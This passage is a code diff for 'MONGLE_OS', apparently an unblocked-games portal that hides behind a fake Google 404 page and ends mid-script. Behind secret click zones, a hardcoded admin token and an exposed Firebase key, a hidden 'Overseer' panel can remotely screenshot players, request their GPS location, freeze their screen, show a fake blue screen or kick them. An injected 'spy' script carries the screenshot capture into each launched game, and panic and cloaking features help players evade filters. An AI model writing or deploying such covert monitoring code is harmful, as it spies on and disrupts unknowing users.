@@ -6,420 +6,432 @@
     <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        /* --- CORE THEME --- */
-        :root { 
-            --primary: #0f0; --dim: #004400; --bg: #050505; --panel: #0a0a0a; 
-            --border: #1a1a1a; --text: #e0e0e0; --accent: #00ff41; 
-            --err: #ff3333; --warn: #ffcc00;
+        /* --- ONYX THEME ENGINE --- */
+        :root {
+            --bg: #050505;
+            --glass: rgba(20, 20, 20, 0.7);
+            --border: rgba(255, 255, 255, 0.1);
+            --primary: #00ff9d;
+            --primary-dim: rgba(0, 255, 157, 0.1);
+            --text: #e0e0e0;
+            --accent: #ff0055;
+            --font-main: 'Segoe UI', 'Roboto', sans-serif;
+            --font-mono: 'Consolas', 'Courier New', monospace;
         }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #222; font-family: 'Segoe UI', sans-serif; overflow: hidden; user-select: none; }
-        
-        /* --- LOCKDOWN MASK (Google 404 Replica) --- */
-        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 10000; padding: 30px; display: flex; flex-direction: column; font-family: arial, sans-serif; }
-        #lockdown h1 { font-weight: normal; margin: 0 0 10px; color: #222; font-size: 24px; }
-        #lockdown p { font-size: 14px; color: #444; margin: 0; }
-        #lockdown span { color: #777; font-size: 13px; margin-top: 10px; display: block; }
-        
-        /* Secret Click Areas */
-        #ghostAdmin { position: fixed; top: 0; left: 0; width: 50px; height: 50px; z-index: 20000; cursor: default; }
-        #ghostPleb { position: fixed; top: 0; right: 0; width: 50px; height: 50px; z-index: 20000; cursor: default; }
 
-        /* --- OS INTERFACE --- */
-        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--text); font-family: 'Consolas', 'Courier New', monospace; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; font-family: var(--font-main); overflow: hidden; user-select: none; }
         
-        /* Navigation Bar */
-        .nav { height: 50px; background: #000; border-bottom: 1px solid var(--dim); display: flex; align-items: center; padding: 0 20px; justify-content: space-between; }
-        .logo { color: var(--primary); font-weight: bold; font-size: 16px; letter-spacing: 1px; }
-        .logo span { color: #555; font-size: 10px; margin-left: 5px; }
+        /* --- 1. THE MASK (Google 404 Replica) --- */
+        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 99999; display: flex; flex-direction: column; padding: 40px; font-family: arial, sans-serif; color: #222; }
+        #lockdown h1 { font-weight: normal; margin: 0 0 10px; font-size: 22px; }
+        #lockdown p { font-size: 14px; margin: 0; line-height: 1.5; }
+        #lockdown span { color: #777; font-size: 13px; margin-top: 15px; display: block; }
+        
+        /* Secret Triggers */
+        .ghost-zone { position: fixed; width: 60px; height: 60px; z-index: 100000; cursor: default; }
+        #gz-admin { top: 0; left: 0; }
+        #gz-user { top: 0; right: 0; }
 
-        .search-bar { background: #111; border: 1px solid #333; color: var(--primary); padding: 5px 10px; width: 300px; font-family: inherit; font-size: 13px; outline: none; border-radius: 3px; transition: 0.2s; }
-        .search-bar:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0,255,0,0.1); }
+        /* --- 2. THE OS UI --- */
+        #app-layer { display: none; position: fixed; inset: 0; background: var(--bg); color: var(--text); flex-direction: column; background-image: radial-gradient(circle at 50% 50%, #111 0%, #000 100%); }
+        
+        /* Navbar */
+        .nav-bar { height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 25px; border-bottom: 1px solid var(--border); background: var(--glass); backdrop-filter: blur(10px); z-index: 10; }
+        .brand { font-family: var(--font-mono); font-weight: bold; letter-spacing: 2px; color: var(--primary); display: flex; align-items: center; gap: 10px; }
+        .brand-badge { font-size: 9px; background: var(--primary-dim); padding: 3px 6px; border-radius: 4px; color: var(--primary); border: 1px solid var(--primary); }
+        
+        /* Search */
+        .search-container { position: relative; width: 40%; }
+        .search-input { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 10px 15px; border-radius: 8px; color: #fff; font-family: var(--font-mono); outline: none; transition: 0.3s; }
+        .search-input:focus { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-dim); background: rgba(0,0,0,0.3); }
 
         /* Game Grid */
-        .game-grid { flex: 1; overflow-y: auto; padding: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
-        .game-grid::-webkit-scrollbar { width: 8px; }
-        .game-grid::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
-        
-        .card { background: var(--panel); border: 1px solid var(--border); height: 120px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: all 0.2s ease; border-radius: 6px; }
-        .card:hover { border-color: var(--primary); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,0,0.1); background: #0e0e0e; }
-        .card-title { font-size: 13px; color: #aaa; margin-top: 10px; font-weight: bold; letter-spacing: 0.5px; }
-        .fav-btn { position: absolute; top: 8px; right: 8px; color: #333; font-size: 18px; transition: 0.2s; z-index: 5; }
-        .fav-btn:hover { color: #666; }
-        .fav-btn.active { color: var(--err); text-shadow: 0 0 8px var(--err); }
+        .grid-container { flex: 1; padding: 30px; overflow-y: auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 20px; }
+        .grid-container::-webkit-scrollbar { width: 6px; }
+        .grid-container::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
 
-        /* --- MODALS & OVERLAYS --- */
-        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
-        .modal { background: #000; border: 1px solid var(--dim); width: 90%; max-width: 1000px; padding: 20px; border-radius: 8px; box-shadow: 0 0 50px rgba(0,0,0,0.8); color: var(--text); position: relative; }
+        .game-card { background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 12px; height: 140px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); overflow: hidden; }
+        .game-card:hover { transform: translateY(-5px) scale(1.02); border-color: var(--primary); box-shadow: 0 10px 30px rgba(0, 255, 157, 0.1); background: rgba(0, 255, 157, 0.05); }
+        .game-card::before { content: ''; position: absolute; inset: 0; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.03)); opacity: 0; transition: 0.3s; }
+        .game-card:hover::before { opacity: 1; }
         
-        .btn { background: #111; color: var(--primary); border: 1px solid var(--dim); padding: 8px 16px; cursor: pointer; font-family: inherit; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; border-radius: 3px; }
-        .btn:hover { background: var(--dim); color: #fff; border-color: var(--primary); }
-        .btn-red { color: var(--err); border-color: #440000; }
-        .btn-red:hover { background: #440000; color: #fff; border-color: var(--err); }
+        .card-icon { font-size: 32px; margin-bottom: 10px; filter: drop-shadow(0 0 5px rgba(255,255,255,0.2)); }
+        .card-title { font-family: var(--font-mono); font-size: 12px; letter-spacing: 1px; color: #aaa; font-weight: bold; text-align: center; padding: 0 10px; }
         
-        /* Admin Panel Specifics */
-        .admin-grid { display: grid; grid-template-columns: 250px 1fr; gap: 20px; height: 500px; }
-        .user-list { border: 1px solid var(--border); background: #080808; overflow-y: auto; }
-        .user-item { padding: 12px; border-bottom: 1px solid #1a1a1a; cursor: pointer; font-size: 12px; display: flex; justify-content: space-between; }
-        .user-item:hover { background: #111; }
-        .user-item.active { background: #002200; border-left: 3px solid var(--primary); color: #fff; }
-        
-        .monitor { background: #000; border: 1px solid var(--dim); height: 300px; margin-bottom: 15px; position: relative; background-size: contain; background-repeat: no-repeat; background-position: center; }
-        .live-tag { position: absolute; top: 10px; right: 10px; background: #f00; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 3px; display: none; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        .fav-heart { position: absolute; top: 10px; right: 10px; font-size: 18px; color: #333; transition: 0.2s; z-index: 5; }
+        .fav-heart:hover { transform: scale(1.2); color: #666; }
+        .fav-heart.active { color: var(--accent); filter: drop-shadow(0 0 5px var(--accent)); }
 
-        /* Effects */
-        #bsod { display:none; position:fixed; inset:0; background:#0078d7; color:#fff; padding:10% 20%; font-family:"Segoe UI"; z-index:99999; cursor:none; }
-        #freeze { display:none; position:fixed; inset:0; background:rgba(255,255,255,0.1); backdrop-filter:grayscale(100%); z-index:99999; cursor:wait; }
+        /* --- 3. OVERLAYS & MODALS --- */
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 5000; align-items: center; justify-content: center; opacity: 0; animation: fadeIn 0.3s forwards; }
+        @keyframes fadeIn { to { opacity: 1; } }
+        
+        .modal-box { background: #0a0a0a; border: 1px solid var(--border); width: 90%; max-width: 900px; border-radius: 16px; padding: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); position: relative; overflow: hidden; }
+        .modal-box::after { content:''; position: absolute; top:0; left:0; right:0; height:1px; background: linear-gradient(90deg, transparent, var(--primary), transparent); }
+
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
+        .modal-title { font-family: var(--font-mono); color: var(--text); font-size: 18px; display: flex; align-items: center; gap: 10px; }
+        
+        /* Admin UI */
+        .admin-layout { display: grid; grid-template-columns: 250px 1fr; gap: 20px; height: 500px; }
+        .user-list { background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; overflow-y: auto; }
+        .user-row { padding: 12px; border-bottom: 1px solid var(--border); cursor: pointer; font-size: 12px; font-family: var(--font-mono); display: flex; justify-content: space-between; transition: 0.2s; color: #888; }
+        .user-row:hover { background: rgba(255,255,255,0.05); color: #fff; }
+        .user-row.selected { background: var(--primary-dim); color: var(--primary); border-left: 3px solid var(--primary); }
+        
+        .screen-preview { flex: 1; background: #000; border: 1px solid var(--border); border-radius: 8px; position: relative; background-size: contain; background-repeat: no-repeat; background-position: center; display: flex; align-items: center; justify-content: center; color: #333; font-family: var(--font-mono); }
+        .live-badge { position: absolute; top: 10px; right: 10px; background: var(--accent); color: #fff; font-size: 9px; padding: 2px 6px; border-radius: 3px; font-weight: bold; display: none; animation: pulse 1s infinite; }
+        @keyframes pulse { 50% { opacity: 0.5; } }
+
+        /* Buttons */
+        .btn { background: rgba(255,255,255,0.05); border: 1px solid var(--border); color: var(--text); padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 11px; font-family: var(--font-mono); transition: 0.2s; text-transform: uppercase; letter-spacing: 1px; }
+        .btn:hover { border-color: var(--primary); color: var(--primary); background: var(--primary-dim); }
+        .btn-danger { color: #ff5555; border-color: rgba(255,85,85,0.2); }
+        .btn-danger:hover { background: rgba(255,85,85,0.1); border-color: #ff5555; color: #fff; }
+        .btn-close { position: absolute; top: 20px; right: 20px; font-size: 20px; color: #555; cursor: pointer; background: none; border: none; }
+        .btn-close:hover { color: #fff; }
+
+        /* --- 4. FX LAYERS --- */
+        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 6000; display: none; padding: 40px; font-family: var(--font-mono); color: var(--primary); font-size: 14px; line-height: 1.6; }
+        #bsod-layer { display:none; position:fixed; inset:0; background:#0078d7; color:#fff; padding:10%; font-family:'Segoe UI'; z-index:999999; cursor:none; font-size: 20px; }
+        #freeze-layer { display:none; position:fixed; inset:0; background:rgba(255,255,255,0.2); backdrop-filter:grayscale(100%) blur(2px); z-index:999999; cursor:not-allowed; }
+        
     </style>
 </head>
 <body>
 
-    <div id="ghostAdmin" onclick="sys.door('admin')"></div>
-    <div id="ghostPleb" onclick="sys.door('user')"></div>
-    
+    <div id="gz-admin" class="ghost-zone" onclick="sys.auth('admin')"></div>
+    <div id="gz-user" class="ghost-zone" onclick="sys.auth('user')"></div>
+
     <div id="lockdown">
         <h1>404. <span style="color:#777; font-weight:normal;">That’s an error.</span></h1>
-        <p>The requested URL was not found on this server. <span style="color:#777;">That’s all we know.</span></p>
+        <p>The requested URL /mongle_os was not found on this server. <span style="color:#777;">That’s all we know.</span></p>
     </div>
 
-    <div id="authLayer" class="overlay">
-        <div class="modal" style="max-width:350px; text-align:center;">
-            <h2 style="color:var(--primary); margin-top:0;">MONGLE_OS v4.0</h2>
-            <input type="text" id="username" class="search-bar" placeholder="IDENTITY_STRING..." style="width:100%; box-sizing:border-box; margin-bottom:15px; text-align:center;">
-            <button class="btn" style="width:100%" onclick="sys.login()">INITIALIZE SESSION</button>
+    <div id="boot-screen"></div>
+
+    <div id="app-layer">
+        <div class="nav-bar">
+            <div class="brand">MONGLE_OS <span id="user-badge" class="brand-badge">GUEST</span></div>
+            <div class="search-container">
+                <input type="text" id="game-search" class="search-input" placeholder="SEARCH DATABASE..." oninput="ui.renderGrid()">
+            </div>
+            <div style="display:flex; gap: 10px;">
+                <button id="btn-overseer" class="btn" style="display:none; color:var(--accent);" onclick="ui.modal('admin-modal')">OVERSEER</button>
+                <button class="btn" onclick="ui.modal('settings-modal')">CONFIG</button>
+                <button class="btn btn-danger" onclick="sys.panic()">PANIC</button>
+            </div>
+        </div>
+        <div id="game-grid" class="grid-container"></div>
+    </div>
+
+    <div id="auth-modal" class="modal-overlay">
+        <div class="modal-box" style="max-width:350px; text-align:center;">
+            <h2 class="modal-title" style="justify-content:center; color:var(--primary);">AUTHENTICATE</h2>
+            <input type="text" id="auth-input" class="search-input" placeholder="IDENTITY..." style="text-align:center; margin: 20px 0;">
+            <button class="btn" style="width:100%" onclick="sys.login()">CONNECT</button>
         </div>
     </div>
 
-    <div id="app">
-        <div class="nav">
-            <div class="logo">MONGLE_OS <span id="idBadge">GUEST</span></div>
-            <input type="text" id="search" class="search-bar" placeholder="SEARCH DATABASE..." oninput="ui.render()">
-            <div style="display:flex; gap:10px;">
-                <button id="admBtn" class="btn" style="display:none; color:var(--warn);" onclick="ui.toggle('adminPanel')">OVERSEER</button>
-                <button class="btn" onclick="ui.toggle('settingsPanel')">CONFIG</button>
-                <button class="btn btn-red" onclick="sys.panic()">PANIC</button>
+    <div id="settings-modal" class="modal-overlay">
+        <div class="modal-box" style="max-width:450px;">
+            <div class="modal-header">
+                <div class="modal-title">⚙️ SYSTEM CONFIGURATION</div>
+                <button class="btn-close" onclick="ui.closeModals()">×</button>
             </div>
-        </div>
-        <div id="grid" class="game-grid"></div>
-    </div>
-
-    <div id="settingsPanel" class="overlay">
-        <div class="modal" style="max-width:400px;">
-            <h3 style="border-bottom:1px solid #333; padding-bottom:10px; margin-top:0;">SYSTEM CONFIGURATION</h3>
-            
-            <div style="margin-bottom:15px;">
-                <label style="font-size:11px; color:#888;">PANIC TRIGGER (KEY)</label>
-                <input type="text" id="cfgKey" class="search-bar" style="width:100%; text-align:center; cursor:pointer;" readonly value="ESCAPE">
+            <div style="display:flex; flex-direction:column; gap:15px;">
+                <div>
+                    <label style="font-size:11px; color:#888; display:block; margin-bottom:5px;">PANIC TRIGGER (PRESS KEY)</label>
+                    <input type="text" id="cfg-key" class="search-input" readonly style="cursor:pointer; text-align:center;" value="ESCAPE">
+                </div>
+                <div>
+                    <label style="font-size:11px; color:#888; display:block; margin-bottom:5px;">PANIC URL</label>
+                    <input type="text" id="cfg-url" class="search-input" value="https://google.com">
+                </div>
+                <div>
+                    <label style="font-size:11px; color:#888; display:block; margin-bottom:5px;">STEALTH MODE</label>
+                    <select id="cfg-mode" class="search-input">
+                        <option value="blob">BLOB TAB (Recommended)</option>
+                        <option value="tab">STANDARD TAB</option>
+                    </select>
+                </div>
+                <button class="btn" onclick="sys.saveCfg()">SAVE CONFIGURATION</button>
             </div>
-
-            <div style="margin-bottom:15px;">
-                <label style="font-size:11px; color:#888;">PANIC DESTINATION (URL)</label>
-                <input type="text" id="cfgUrl" class="search-bar" style="width:100%;" value="https://google.com">
-            </div>
-
-            <div style="margin-bottom:15px;">
-                <label style="font-size:11px; color:#888;">STEALTH PROTOCOL</label>
-                <select id="cfgMode" class="search-bar" style="width:100%;">
-                    <option value="blob">BLOB CLOAK (Highest Security)</option>
-                    <option value="tab">STANDARD TAB (Faster)</option>
-                </select>
-            </div>
-
-            <button class="btn" style="width:100%; border-color:var(--primary);" onclick="sys.saveCfg()">APPLY CHANGES</button>
-            <button class="btn btn-red" style="width:100%; margin-top:5px;" onclick="ui.toggle('settingsPanel')">CANCEL</button>
         </div>
     </div>
 
-    <div id="adminPanel" class="overlay">
-        <div class="modal">
-            <div style="display:flex; justify-content:space-between; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px;">
-                <h3 style="margin:0; color:var(--warn);">OVERSEER_CONTROL_DECK</h3>
-                <button class="btn" onclick="ui.toggle('adminPanel')">CLOSE LINK</button>
+    <div id="admin-modal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">
+                <div class="modal-title" style="color:var(--accent);">👁️ OVERSEER CONTROL DECK</div>
+                <button class="btn-close" onclick="ui.closeModals()">×</button>
             </div>
-            
-            <div class="admin-grid">
-                <div id="userList" class="user-list"></div>
-                
-                <div style="display:flex; flex-direction:column;">
-                    <div id="monitor" class="monitor">
-                        <div class="live-tag" id="liveTag">● LIVE FEED</div>
+            <div class="admin-layout">
+                <div id="user-list-view" class="user-list"></div>
+                <div style="display:flex; flex-direction:column; gap:10px;">
+                    <div id="monitor-view" class="screen-preview">
+                        <span style="opacity:0.3">NO SIGNAL</span>
+                        <div id="live-tag" class="live-badge">LIVE</div>
                     </div>
-                    
-                    <div id="intel" style="font-size:11px; color:#888; margin-bottom:10px; height:60px; overflow:hidden;">Waiting for target selection...</div>
-
-                    <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:10px;">
-                        <button class="btn" onclick="adm.act('capReq')">📸 SCREEN</button>
-                        <button class="btn" id="watchBtn" style="color:var(--primary);" onclick="adm.watch()">👁️ WATCH</button>
-                        <button class="btn" onclick="adm.act('reload')">↻ RELOAD</button>
-                        <button class="btn" onclick="adm.act('gpsReq')">📍 GPS</button>
-                        
-                        <button class="btn btn-red" onclick="adm.act('frozen')">❄️ FREEZE</button>
-                        <button class="btn btn-red" onclick="adm.act('bsod')">☠️ BSOD</button>
-                        <button class="btn btn-red" onclick="adm.act('kicked')">🚫 KICK</button>
-                        <button class="btn btn-red" onclick="adm.nuke()">☢️ NUKE ALL</button>
+                    <div id="target-info" style="font-family:var(--font-mono); font-size:11px; color:#666;">Select a target...</div>
+                    <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:8px;">
+                        <button class="btn" onclick="adm.cmd('capReq')">📸 CAP</button>
+                        <button class="btn" id="btn-watch" onclick="adm.watch()">👁️ WATCH</button>
+                        <button class="btn" onclick="adm.cmd('reload')">↻ RLOAD</button>
+                        <button class="btn" onclick="adm.cmd('gpsReq')">📍 GPS</button>
+                        <button class="btn btn-danger" onclick="adm.cmd('frozen')">❄️ FREEZE</button>
+                        <button class="btn btn-danger" onclick="adm.cmd('bsod')">☠️ BSOD</button>
+                        <button class="btn btn-danger" onclick="adm.cmd('kicked')">🚫 KICK</button>
+                        <button class="btn" style="border-color:var(--primary); color:var(--primary);" onclick="adm.chat()">💬 CHAT</button>
                     </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <div id="freeze"></div>
-    <div id="bsod">:(<br><br>Your PC ran into a problem and needs to restart.<br><br>Stop Code: CRITICAL_PROCESS_DIED</div>
+    <div id="bsod-layer">:(<br><br>Your PC ran into a problem and needs to restart.<br><br>Stop Code: CRITICAL_PROCESS_DIED</div>
+    <div id="freeze-layer"></div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, onValue, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        // 1. CONFIG
-        const DB_CONFIG = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
-        const app = initializeApp(DB_CONFIG);
+        // CONFIG
+        const DB_CFG = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
+        const app = initializeApp(DB_CFG);
         const db = getDatabase(app);
-        
-        // 2. STATE
-        let state = {
-            user: null, id: null, isAdmin: false,
-            games: [], favs: JSON.parse(localStorage.getItem('favs')||'[]'),
+
+        // STATE
+        let s = {
+            id: null,
+            user: "Guest",
+            isAdmin: false,
+            games: [],
+            favs: JSON.parse(localStorage.getItem('favs')||'[]'),
             cfg: {
                 key: localStorage.getItem('mKey') || 'Escape',
                 url: localStorage.getItem('mUrl') || 'https://google.com',
                 mode: localStorage.getItem('mMode') || 'blob'
             },
-            admin: { selected: null, watchTimer: null }
+            adm: { sel: null, timer: null }
         };
 
-        // 3. UI CONTROLLER
+        // UI MANAGER
         window.ui = {
-            toggle: (id) => { const el = document.getElementById(id); el.style.display = el.style.display==='flex'?'none':'flex'; },
-            
-            render: () => {
-                const grid = document.getElementById('grid'); grid.innerHTML = '';
-                const q = document.getElementById('search').value.toLowerCase();
+            modal: (id) => {
+                document.querySelectorAll('.modal-overlay').forEach(e => e.style.display='none');
+                document.getElementById(id).style.display = 'flex';
+            },
+            closeModals: () => {
+                document.querySelectorAll('.modal-overlay').forEach(e => e.style.display='none');
+            },
+            renderGrid: () => {
+                const g = document.getElementById('game-grid'); g.innerHTML = '';
+                const q = document.getElementById('game-search').value.toLowerCase();
                 
-                state.games.filter(g => g.name.toLowerCase().includes(q)).forEach(g => {
-                    const el = document.createElement('div'); el.className = 'card';
-                    const isFav = state.favs.includes(g.name);
+                // Sort Favs first
+                const list = [...s.games].sort((a,b) => s.favs.includes(b.name) - s.favs.includes(a.name));
+
+                list.filter(x => x.name.toLowerCase().includes(q)).forEach(game => {
+                    const isFav = s.favs.includes(game.name);
+                    const el = document.createElement('div'); el.className = 'game-card';
                     el.innerHTML = `
-                        <div class="fav-btn ${isFav?'active':''}" onclick="event.stopPropagation(); ui.fav('${g.name}')">❤</div>
-                        <div style="font-size:24px; color:var(--primary);">👾</div>
-                        <div class="card-title">${g.name.replace('.html','').toUpperCase()}</div>
+                        <div class="fav-heart ${isFav?'active':''}" onclick="event.stopPropagation(); ui.fav('${game.name}')">❤</div>
+                        <div class="card-icon">👾</div>
+                        <div class="card-title">${game.name.replace('.html','').toUpperCase()}</div>
                     `;
-                    el.onclick = () => sys.launch(g.name);
-                    grid.appendChild(el);
+                    el.onclick = () => sys.launch(game.name);
+                    g.appendChild(el);
                 });
             },
-
             fav: (n) => {
-                if(state.favs.includes(n)) state.favs = state.favs.filter(x=>x!==n);
-                else state.favs.push(n);
-                localStorage.setItem('favs', JSON.stringify(state.favs));
-                ui.render();
+                if(s.favs.includes(n)) s.favs = s.favs.filter(x=>x!==n); else s.favs.push(n);
+                localStorage.setItem('favs', JSON.stringify(s.favs));
+                ui.renderGrid();
+            },
+            boot: (cb) => {
+                const b = document.getElementById('boot-screen');
+                b.style.display = 'block';
+                const lines = ["> CONNECTING TO SECURE SERVER...", "> BYPASSING FIREWALL...", "> DECRYPTING ASSETS...", "> ACCESS GRANTED."];
+                let i = 0;
+                const int = setInterval(() => {
+                    if(i >= lines.length) {
+                        clearInterval(int);
+                        setTimeout(() => { b.style.display='none'; cb(); }, 500);
+                    } else {
+                        b.innerHTML += lines[i] + "<br>";
+                        i++;
+                    }
+                }, 300);
             }
         };
 
-        // 4. SYSTEM LOGIC
+        // SYSTEM LOGIC
         window.sys = {
-            door: (type) => {
-                if(type==='admin') {
-                    if(prompt('AUTH_TOKEN:') === 'BALLS_ARE_GOOD') { 
-                        state.isAdmin = true; 
-                        document.getElementById('admBtn').style.display='block';
-                        document.getElementById('idBadge').innerText = '[OVERSEER]';
-                        document.getElementById('idBadge').style.color = 'var(--warn)';
+            auth: (type) => {
+                if(type === 'admin') {
+                    if(prompt("OVERSEER TOKEN:") === "BALLS_ARE_GOOD") {
+                        s.isAdmin = true;
+                        document.getElementById('btn-overseer').style.display = 'block';
+                        document.getElementById('user-badge').innerText = "OVERSEER";
+                        document.getElementById('user-badge').style.borderColor = "var(--accent)";
+                        document.getElementById('user-badge').style.color = "var(--accent)";
                         sys.login();
                     }
                 } else {
-                    document.getElementById('authLayer').style.display = 'flex';
+                    ui.modal('auth-modal');
                 }
             },
-
             login: async () => {
-                const name = document.getElementById('username').value || 'User_'+Math.floor(Math.random()*1000);
-                document.getElementById('lockdown').style.display = 'none';
-                document.getElementById('authLayer').style.display = 'none';
-                document.getElementById('app').style.display = 'flex';
-
-                // Register Presence
-                const refLink = push(ref(db, 'presence'), {
-                    name: name, activity: 'Idle', joined: Date.now(),
-                    res: `${screen.width}x${screen.height}`,
-                    ua: navigator.userAgent
+                ui.closeModals();
+                document.getElementById('lockdown').style.display='none';
+                
+                // User Name
+                const inp = document.getElementById('auth-input').value;
+                s.user = inp || "User_" + Math.floor(Math.random()*999);
+                
+                ui.boot(() => {
+                    document.getElementById('app-layer').style.display = 'flex';
+                    sys.netInit();
                 });
-                state.id = refLink.key;
-                onDisconnect(refLink).remove();
+
+                // Load Games
+                const r = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
+                const d = await r.json();
+                s.games = d.filter(x => x.name.endsWith('.html') && x.name !== 'index.html');
+                ui.renderGrid();
+            },
+            netInit: () => {
+                const node = push(ref(db, 'presence'), {
+                    name: s.user, activity: 'Idle', joined: Date.now(),
+                    res: `${screen.width}x${screen.height}`
+                });
+                s.id = node.key;
+                onDisconnect(node).remove();
 
                 // Listen for Commands
-                onValue(ref(db, `presence/${state.id}`), s => {
-                    const d = s.val(); if(!d) return;
-                    if(d.kicked) window.location.href = state.cfg.url;
+                onValue(ref(db, `presence/${s.id}`), snap => {
+                    const d = snap.val(); if(!d) return;
+                    if(d.kicked) window.location.href = s.cfg.url;
                     if(d.reload) window.location.reload();
                     
-                    document.getElementById('freeze').style.display = d.frozen ? 'block' : 'none';
-                    document.getElementById('bsod').style.display = d.bsod ? 'block' : 'none';
-                    if(d.frozen || d.bsod) { if(state.win) state.win.close(); }
-
+                    document.getElementById('freeze-layer').style.display = d.frozen ? 'block' : 'none';
+                    document.getElementById('bsod-layer').style.display = d.bsod ? 'block' : 'none';
+                    
+                    if(d.msg) { alert("MSG FROM OVERSEER:\n" + d.msg); update(node, {msg:null}); }
+                    
                     if(d.capReq) {
-                        html2canvas(document.body).then(c => update(refLink, { lastCap: c.toDataURL('image/webp', 0.2), capReq: false }));
+                        html2canvas(document.body).then(c => update(node, { lastCap: c.toDataURL('image/webp', 0.2), capReq: false }));
                     }
                     if(d.gpsReq) {
                         navigator.geolocation.getCurrentPosition(
-                            p => update(refLink, { gps: `${p.coords.latitude},${p.coords.longitude}`, gpsReq: false }),
-                            e => update(refLink, { gps: 'DENIED', gpsReq: false })
+                            p => update(node, { gps: `${p.coords.latitude},${p.coords.longitude}`, gpsReq: false }),
+                            e => update(node, { gps: 'DENIED', gpsReq: false })
                         );
                     }
                 });
 
-                // Fetch Games
-                const r = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
-                const json = await r.json();
-                state.games = json.filter(x => x.name.endsWith('.html') && x.name !== 'index.html');
-                ui.render();
-
-                if(state.isAdmin) adm.init();
+                if(s.isAdmin) adm.init();
             },
+            launch: (name) => {
+                const url = `https://raw.githack.com/bob154526-hue/Mongle/main/${name}`;
+                update(ref(db, `presence/${s.id}`), { activity: 'Playing ' + name });
 
-            launch: (game) => {
-                const url = `https://raw.githack.com/bob154526-hue/Mongle/main/${game}`;
-                update(ref(db, `presence/${state.id}`), { activity: 'Playing ' + game });
+                const spy = `<script type="module">
+                    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+                    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+                    import "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+                    const db = getDatabase(initializeApp({ apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" }));
+                    onValue(ref(db, 'presence/${s.id}'), s => {
+                        const d = s.val();
+                        if(d?.capReq) html2canvas(document.body).then(c => update(ref(db, 'presence/${s.id}'), { lastCap: c.toDataURL('image/webp', 0.2), capReq: false }));
+                        if(d && (d.kicked || d.bsod || d.frozen)) window.close();
+                    });
+                <\/script>`;
 
-                // THE SPY SCRIPT: Injected into the Blob to allow remote monitoring
-                const spy = `
-                    <script type="module">
-                        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-                        import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-                        import "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
-                        
-                        const db = getDatabase(initializeApp({ apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" }));
-                        const myRef = ref(db, 'presence/${state.id}');
-                        
-                        onValue(myRef, (s) => {
-                            const d = s.val();
-                            if(d && d.capReq) {
-                                // Capture the body. Note: Cannot capture cross-origin iframe content due to browser security.
-                                // It will capture the UI around it.
-                                html2canvas(document.body).then(c => {
